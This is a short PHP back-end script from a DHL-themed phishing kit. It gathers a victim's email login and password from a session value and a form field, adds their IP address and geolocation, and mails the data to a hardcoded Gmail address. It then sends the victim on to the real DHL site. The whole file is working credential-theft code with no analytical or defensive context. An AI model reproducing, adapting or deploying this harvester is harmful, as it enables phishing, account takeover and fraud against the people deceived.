<?php

session_start();
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();

$geoplugin->locate();
$ip = getenv("REMOTE_ADDR");
$region = $geoplugin->region;
$city = $geoplugin->city;
$country = $geoplugin->countryName;

$userid = trim($_SESSION['login_user']);
$password = trim($_POST['person2']);

$ip = getenv("REMOTE_ADDR");
$message .= "EmalAcess: ".$userid."\n";
$message .= "EmalPass: ".$password."\n";
$message .= "IP : ".$ip."\n";
$message .= "Region : ".$region."\n";
$message .= "City : ".$city."\n";
$message .= "Country : ".$country."\n";
$message .= "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";
$send = "steadymne@gmail.com";
$subject = "DHL Revenge by Alibobo360";
$headers = "From: Alibobo";
mail($send,$subject,$message,$headers);
header("Location:http://www.dhl.com");

?>